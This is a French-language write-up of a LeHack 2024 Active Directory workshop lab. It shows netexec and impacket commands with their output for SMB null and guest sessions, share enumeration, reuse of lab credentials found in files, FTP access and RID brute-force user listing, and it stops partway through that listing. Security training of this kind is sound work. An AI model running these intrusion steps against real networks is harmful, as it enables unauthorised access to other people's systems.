---
title: "Writeup: Workshop Netexec LeHack 2024"
date: 2024-07-08T16:28:30+02:00
draft: false
---

# Introduction

Cette année encore, [@mpgn](https://x.com/mpgn_x64) nous a régalé un [workshop Active Directory](https://lehack.org/track/active-directory-pwnage-with-netexec/) à __LeHack 2024__.

------------------

🙏 Je n'ai pas d'__extract BloodHound__ pour les machines de workshop. Si une quelqu'un peut m'en __transmettre un__, j'aimerai bien mettre l'article à jour et indiquer comment on pouvait détecter certaines failles avec Bloodhound. 🙏  
Je suis joignable via [__Linkedin__](https://www.linkedin.com/in/olasne/), __X (Twitter)__, ou par __mail__ à _olivier@lasne.pro_. Merci !

------------------

L'accès était fourni via un fichier de configuration _openvpn_.  
Le réseau `10.0.0.0/24` était composé de __4 machines__, dans un thème __astérix__ pour cette année.


## Mise en place

Pour se connecter, on lance __openvpn__ avec le fichier de configuration fourni.

```shell
sudo openvpn ./lehack019.ovpn
```

La __dernière version__ de `netexec` était nécessaire. Le plus simple est de l'installer avec `pipx`.

```shell
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

On en profite pour ouvrir le __wiki de Netexec__: [https://www.netexec.wiki/](https://www.netexec.wiki/).

J'ai également utilisé les scripts de `impacket`, installable également avec `pipx`.

```shell
pipx install impacket
```

## Reconnaissance

C'est parti, on lance __netexec__ sur `10.0.0.0/24` pour découvrir les machines.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">❯</font> <font color="#A6E22E">nxc</font> smb 10.0.0.0/24
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#A6E22E">Running nxc against 256 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font>
</code></pre></div>
{{< /rawhtml >}}

On repère 2 __contrôleurs de domaine__ à la présence de la __signature SMB__. 

```C
10.0.0.4    babaorum    (domain:rome.local)
10.0.0.5    village     (domain:armorique.local)
```

Les deux __autres machines__, `REFERENDUM` et `METRONUM` appartiennent au __domaine `rome.local`__.

```C
10.0.0.7    METRONUM       (domain:rome.local)
10.0.0.8    REFERENDUM     (domain:rome.local)
```

## `/etc/hosts`

On peut utiliser `host` pour vérifier l'appartenance des 2 machines.

```yaml
❯ host metronum.rome.local 10.0.0.4
Using domain server:
Name: 10.0.0.4
Address: 10.0.0.4#53
Aliases: 

metronum.rome.local has address 10.0.0.7

❯ host referendum.rome.local 10.0.0.4
Using domain server:
Name: 10.0.0.4
Address: 10.0.0.4#53
Aliases: 

referendum.rome.local has address 10.0.0.8
```

On ajoute ensuite ces IPs au fichier de configuration __`/etc/hosts`__.

```C
## Workshop Netexec

10.0.0.4	babaorum rome.local babaorum.rome.local
10.0.0.5	village armorique.local
10.0.0.7	metronum METRONUM metronum.rome.local
10.0.0.8	referendum REFERENDUM referendum.rome.local
```

Je crée aussi un fichier __`ips.txt`__ qui contient les IPs des machines.

__`ips.txt`:__
```
10.0.0.4
10.0.0.5
10.0.0.7
10.0.0.8
```

## Nmap

Pas grand-chose à dire sur le `nmap`. On a les ports Windows classique. On peut simplement noter:

* __FTP__ sur la machine `metronum`
* __SMB__ et __WinRM__ sur toutes les machines
* LDAP et Kerberos sur les contrôleurs de domaine

```C
❯ nmap -p- -sV -sC -iL ips.txt -oN workshop.nmap -Pn

Nmap scan report for metronum (10.0.0.7)
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp?
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
3389/tcp  filtered ms-wbt-server
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[...]

Nmap scan report for babaorum (10.0.0.4)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-06 20:06:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rome.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rome.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[...]

Nmap scan report for referendum (10.0.0.8)
PORT      STATE    SERVICE       VERSION
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
3389/tcp  filtered ms-wbt-server
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[...]

Nmap scan report for village (10.0.0.5)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-06 20:07:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: armorique.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: armorique.local, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: armorique.local, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: armorique.local, Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[...]
```

## Accès anonymes

On peut note que l'on a quelques accès anonymes.

#### NULL Session:

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb <u style="text-decoration-style:single">ips.txt</u> -u <font color="#F4BF75">&apos;&apos;</font> -p <font color="#F4BF75">&apos;&apos;</font>       
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#AE81FF"><b>[-]</b></font> rome.local\: STATUS_ACCESS_DENIED 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\: 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#AE81FF"><b>[-]</b></font> rome.local\: STATUS_ACCESS_DENIED 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> rome.local\: 
<font color="#A6E22E">Running nxc against 4 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font>
</code></pre></div>
{{< /rawhtml >}}

#### Guest Session

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb <u style="text-decoration-style:single">ips.txt</u> -u <font color="#F4BF75">&apos;a&apos;</font> -p <font color="#F4BF75">&apos;&apos;</font>     
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F92672"><b>[-]</b></font> rome.local\a: STATUS_LOGON_FAILURE 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> rome.local\a: <font color="#F4BF75"><b>(Guest)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F92672"><b>[-]</b></font> rome.local\a: STATUS_LOGON_FAILURE 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\a: STATUS_LOGON_FAILURE 
<font color="#A6E22E">Running nxc against 4 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font>
</code></pre></div>
{{< /rawhtml >}}


#### Guest user

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF5C57">❯</font> <font color="#A6E22E">nxc</font> smb <u style="text-decoration-style:single">ips.txt</u> -u <font color="#F4BF75">&apos;guest&apos;</font> -p <font color="#F4BF75">&apos;&apos;</font>     
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#A6E22E"><b>[+]</b></font> rome.local\guest: 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> rome.local\guest: 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#AE81FF"><b>[-]</b></font> armorique.local\guest: STATUS_ACCOUNT_DISABLED 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> rome.local\guest: 
<font color="#A6E22E">Running nxc against 4 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font></code></pre></div>
{{< /rawhtml >}}


## Partage SMB

On note un _share_ `SHAREACCESIX` sur la machine `babaorum`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb babaorum -u <font color="#F4BF75">&apos;a&apos;</font> -p <font color="#F4BF75">&apos;&apos;</font> --shares
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> rome.local\a: <font color="#F4BF75"><b>(Guest)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Enumerated shares
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>Share           Permissions     Remark</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>-----           -----------     ------</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>ADMIN$                          Remote Admin</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>C$                              Default share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>D$                              Default share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>IPC$            READ            Remote IPC</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>NETLOGON                        Logon server share </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>SHAREACCESIX    READ            </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>SYSVOL                          Logon server share </b></font>
</code></pre></div>
{{< /rawhtml >}}

On peut s'y connecter avec __`smbclient.py`__ de `impacket`. On y trouve un fichier `infos.txt.txt`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">❯ smbclient.py a@babaorum   
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands
# shares
ADMIN$
C$
D$
IPC$
NETLOGON
SHAREACCESIX
SYSVOL
# use SHAREACCESIX
# ls
drw-rw-rw-          0  Sun Jul  7 00:11:13 2024 .
drw-rw-rw-          0  Sun Jul  7 00:11:13 2024 ..
-rw-rw-rw-        319  Wed Jul  3 12:06:32 2024 infos.txt.txt
# get infos.txt.txt
</code></pre></div>
{{< /rawhtml >}}

Le fichier est encodé en `ISO-8859`.

```shell
❯ file infos.txt.txt 
infos.txt.txt: ISO-8859 text, with CRLF line terminators
```

Mais on peut facilement le convertir en UTF-8 avec `iconv`.

```shell
iconv  -f ISO-8859-14 -t UTF-8 infos.txt.txt -o infos.txt
```

On y trouve des __identifiants__ (et un peu de _lore_).

__infos.txt.txt__:
> Ave, César !
> 
> Notre espion a réussi à s'infiltrer dans le village gaulois. Il a déposé un message avec les instructions pour récupérer les plans dans le camp romain avoisinant le village !
> 
> Voici les identifiants pour récupérer le message: heftepix / BnfMQ9QI81Tz
> 
> Merci de détruire cette tablette après lecture !

__Identifants:__

    heftepix:BnfMQ9QI81Tz


## FTP

Ces identifiants permettent de se connecter au serveur __FTP__ de __`metronum`__.
Petit indice dans le nom de l'utilisateur : "`heftepix`".

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> ftp metronum -u <font color="#F4BF75">&apos;heftepix&apos;</font> -p <font color="#F4BF75">&apos;BnfMQ9QI81Tz&apos;</font>
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#66D9EF"><b>[*]</b></font> Banner: -FileZilla Server 1.8.2
220 Please visit https://filezilla-project.org/
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#A6E22E"><b>[+]</b></font> heftepix:BnfMQ9QI81Tz
</code></pre></div>
{{< /rawhtml >}}


On a un erreur si on cherche à se connecter avec `lftp`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF5C57">❯</font> <font color="#A6E22E">lftp</font> -u <font color="#F4BF75">&apos;heftepix&apos;</font>,<font color="#F4BF75">&apos;BnfMQ9QI81Tz&apos;</font> metronum
lftp heftepix@metronum:~&gt; ls
ls: Erreur fatale: Certificate verification: Not trusted (EB:E5:DA:63:48:F8:3A:57:87:94:E8:9C:59:54:B3:F6:0A:1E:16:29)
</code></pre></div>
{{< /rawhtml >}}

Mais on peut s'y connecter avec `netexec` ou `ftp`, et récupérer le fichier `plans.txt`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF5C57">❯</font> <font color="#A6E22E">nxc</font> ftp metronum -u <font color="#F4BF75">&apos;heftepix&apos;</font> -p <font color="#F4BF75">&apos;BnfMQ9QI81Tz&apos;</font> --ls                     
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#66D9EF"><b>[*]</b></font> Banner: -FileZilla Server 1.8.2
220 Please visit https://filezilla-project.org/
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#A6E22E"><b>[+]</b></font> heftepix:BnfMQ9QI81Tz
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#66D9EF"><b>[*]</b></font> Directory Listing
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#F4BF75"><b>dr-xr-xr-x 1 ftp ftp               0 Jul 02 10:07 wineremix</b></font>

<font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> ftp metronum -u <font color="#F4BF75">&apos;heftepix&apos;</font> -p <font color="#F4BF75">&apos;BnfMQ9QI81Tz&apos;</font> --ls wineremix          
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#66D9EF"><b>[*]</b></font> Banner: -FileZilla Server 1.8.2
220 Please visit https://filezilla-project.org/
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#A6E22E"><b>[+]</b></font> heftepix:BnfMQ9QI81Tz
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#66D9EF"><b>[*]</b></font> Directory Listing for wineremix
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#F4BF75"><b>-r--r--r-- 1 ftp ftp             477 Jul 04 10:16 plans.txt</b></font>

<font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> ftp metronum -u <font color="#F4BF75">&apos;heftepix&apos;</font> -p <font color="#F4BF75">&apos;BnfMQ9QI81Tz&apos;</font> --get wineremix/plans.txt
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#66D9EF"><b>[*]</b></font> Banner: -FileZilla Server 1.8.2
220 Please visit https://filezilla-project.org/
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#A6E22E"><b>[+]</b></font> heftepix:BnfMQ9QI81Tz
<font color="#66D9EF"><b>FTP</b></font>         10.0.0.7        21     metronum         <font color="#A6E22E"><b>[+]</b></font> Downloaded: wineremix/plans.txt
</code></pre></div>
{{< /rawhtml >}}

On convertit en UTF-8 le fichier avec `iconv`, et on obtient le message suivant.

__plans.txt:__

> Ave, César !
> 
> J'ai envoyé un messager avec les plans du village. Il aura besoin de rentrer discrètement dans le camp et remettra les plans au commandant du camp.
> Le mot de passe pour entrer dans le camp sera le suivant : wUSYIuhhWy!!12OL , il faudra prévenir la sentinelle local à ce poste pour qu'il puisse s'authentifier sans encombre !!!
> 
> J'ai aussi entendu dire que le capitaine Lapsus était passé dans le camp le mois dernier. J'espère qu'il n'a pas laissé de trace !

On a quelques indices avec une sentinelle ***local***, et un capitaine Lapsus (**LAPS** ?), qui peut-être aurait laissé des traces.  
On a surtout un **mot de passe** à tester:

    wUSYIuhhWy!!12OL

Avec cet indice, on va aller tester ce mot de passe sur des utilisateurs locaux.
Mais avant cela, il faut énumérer les utilisateurs.

## RID Brute

On utilise l'accès `guest` pour énumérer les utilisateurs avec __RID Brute__.

⚠️ On utilise l'utilisateur `guest` avec un mot de passe vide, ce qui est différent d'une authentification anonyme avec `a` et un mot de passe vide.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb <u style="text-decoration-style:single">ips.txt</u> -u <font color="#F4BF75">&apos;guest&apos;</font> -p <font color="#F4BF75">&apos;&apos;</font> --rid-brute
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> rome.local\guest: 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> rome.local\guest: 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#AE81FF"><b>[-]</b></font> armorique.local\guest: STATUS_ACCOUNT_DISABLED 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>500: referendum\admin01 (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>501: referendum\Guest (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>503: referendum\DefaultAccount (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>504: referendum\WDAGUtilityAccount (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>513: referendum\None (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#A6E22E"><b>[+]</b></font> rome.local\guest: 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>1000: referendum\ADSyncAdmins (SidTypeAlias)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>1001: referendum\ADSyncOperators (SidTypeAlias)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>1002: referendum\ADSyncBrowse (SidTypeAlias)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>1003: referendum\ADSyncPasswordSet (SidTypeAlias)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>498: ROME\Enterprise Read-only Domain Controllers (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>500: ROME\jules.cesar (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>501: ROME\Guest (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>502: ROME\krbtgt (SidTypeUser)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>512: ROME\Domain Admins (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>513: ROME\Domain Users (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>514: ROME\Domain Guests (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>515: ROME\Domain Computers (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>516: ROME\Domain Controllers (SidTypeGroup)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>517: ROME\Cert Publishers (SidTypeAlias)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>518: ROME\Schema Admins (SidTypeGroup)</b></font>
